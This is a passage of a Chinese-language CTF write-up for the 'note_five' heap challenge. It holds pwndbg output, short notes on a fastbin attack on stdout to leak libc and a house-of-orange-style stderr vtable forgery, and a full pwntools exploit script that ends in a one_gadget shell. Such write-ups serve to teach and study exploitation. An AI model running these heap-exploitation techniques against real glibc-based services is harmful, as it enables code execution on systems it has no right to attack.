&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = &lt;span class=&#34;number&#34;&gt;135169&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd = &lt;span class=&#34;number&#34;&gt;0x7fb7435a7b78&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;88&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk = &lt;span class=&#34;number&#34;&gt;0x7fb7435a7b78&lt;/span&gt; &amp;lt;main_arena+&lt;span class=&#34;number&#34;&gt;88&lt;/span&gt;&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fd_nextsize = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  bk_nextsize = &lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;global_max_fast&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; = (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; *) &lt;span class=&#34;number&#34;&gt;0x7fb7435a97f8&lt;/span&gt; &amp;lt;global_max_fast&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p &amp;amp;main_arena&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; malloc_state *) &lt;span class=&#34;number&#34;&gt;0x7fb7435a7b20&lt;/span&gt; &amp;lt;main_arena&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最低三字节不会变，末尾第 4 字节不确定，但是偏移量不变，爆破&lt;/p&gt;
&lt;p&gt;・接着利用 fastbin attack 攻击 stdout-0x51 处，我们要攻击 stdout 结构体来泄露 libc 地址&lt;/p&gt;
&lt;p&gt;・stdout-0x51 处有一个错位的 0xff&lt;/p&gt;
&lt;p&gt;・泄露 libc 之后就用和 house of orange 一样的技巧来 getshell，即伪造 stderr 的 vtable，触发 malloc_printerr 来 getshell&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cmd&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;command&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;gt;&amp;gt; &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(command))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,sz&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmd(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;size: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(sz))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dele&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmd(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmd(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;idx: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;content: &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.send(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;host,port=&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; host:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		p = remote(host,port)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		p = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./note_five&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xa8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x1e8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xe8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xe8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xf8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xf8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x1f8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xe8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	edit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0xf0&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x1f0&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xe8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	t = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(raw_input(&lt;span class=&#34;string&#34;&gt;&amp;#x27;guest: &amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;# t = 8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	global_maxfast = (t &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;) | &lt;span class=&#34;number&#34;&gt;0x7f8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	stdout = global_maxfast-&lt;span class=&#34;number&#34;&gt;0x11d8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	edit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;+p16(global_maxfast-&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x1f8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x1f8&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\xf1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x98&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0xf1&lt;/span&gt;)+p16(stdout-&lt;span class=&#34;number&#34;&gt;0x51&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x2e8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	edit(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;A&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x1f8&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0xf1&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\xa0\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	dele(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xe8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xe8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xe8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	edit(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;\x00&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0xfbad1800&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recv(&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	libc.address = u64(p.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x3c5600&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	info(&lt;span class=&#34;string&#34;&gt;&amp;quot;libc : &amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc.address))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	one_gadget = &lt;span class=&#34;number&#34;&gt;0xf1207&lt;/span&gt;+libc.address&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	payload = &lt;span class=&#34;string&#34;&gt;&amp;#x27;\x00&amp;#x27;&lt;/span&gt;+p64(libc.address+&lt;span class=&#34;number&#34;&gt;0x3c55e0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x1&lt;/span&gt;)+p64(one_gadget)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;+p64(libc.address+&lt;span class=&#34;number&#34;&gt;0x3c5600&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	edit(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,payload+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./libc-2.23.so&amp;quot;&lt;/span&gt;,checksec=&lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;# elf = ELF(&amp;quot;./mheap&amp;quot;,checksec=False)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	main(args[&lt;span 